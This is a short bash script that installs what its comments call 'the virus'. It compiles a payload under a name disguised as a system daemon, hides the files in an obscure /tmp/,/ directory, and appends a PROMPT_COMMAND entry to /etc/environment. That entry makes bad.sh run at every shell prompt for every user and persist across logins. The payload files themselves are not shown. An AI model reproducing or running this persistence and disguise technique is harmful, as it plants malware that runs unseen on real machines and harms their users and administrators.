#!/bin/bash
mkdir compiled
cp cantstopthis ./compiled
cp bad.sh ./compiled
pyinstaller \[systemdeamond\] -F -n \[systemdeamond\]
rm -rf build/
cp dist/* ./compiled
rm -rf dist/
rm \[systemdeamond\].spec 
mkdir -p /tmp/,/
mv compiled/* /tmp/,/
rmdir compiled

# This runs the virus unless bad.sh is moved somewhere or PROMPT_COMMAND is unset
# It also ensures the virus gets run for every user, and that it gets run if a user logs out
# and logs back in (unless the user unsets PROMPT_COMMAND in his/her .bash_rc or bash_profile)
echo 'PROMPT_COMMAND="/tmp/\,/bad.sh"' >> /etc/environment 

#rm ./build.sh
